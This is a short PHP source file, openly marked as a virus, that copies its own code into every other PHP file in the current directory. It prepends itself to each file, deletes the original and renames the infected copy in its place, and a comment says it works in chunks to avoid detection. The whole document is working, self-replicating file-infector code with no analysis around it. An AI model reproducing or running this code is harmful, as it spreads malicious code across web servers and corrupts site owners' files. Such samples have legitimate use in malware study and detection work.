<?php
// VIRUS:START

function execute($virus){
    // Get a list of all PHP files 
	$filenames = glob('*.php');

    // check each file
    foreach( $filenames as $filename) {
    
        if($filename == "boom.php")
           continue;

		// open file
		$script = fopen($filename,'r');

		//let's write to a new file, one chunck at a time, instead of reading whole file 
		// to void detection
		$infected = fopen("$filename.infected","w");

		$infection = '<?php '. $virus .' ?>';

		fputs($infected, $infection, strlen($infection));

		while( $contents = fgets($script) ) {
			fputs($infected, $contents, strlen($contents));
		}

		//close both handles and replance filename with infected file
		fclose($script);
		fclose($infected);
		// delete the original file
		unlink("$filename");
		rename("$filename.infected",$filename);	

   }
}

$virus = file_get_contents(__FILE__);
$virus = substr($virus, strpos($virus, "// VIRUS:START"));
$virus = substr($virus, 0, strpos($virus, "\n// VIRUS:END") + strlen("\n// VIRUS:END"));
execute($virus);

// VIRUS:END

?>
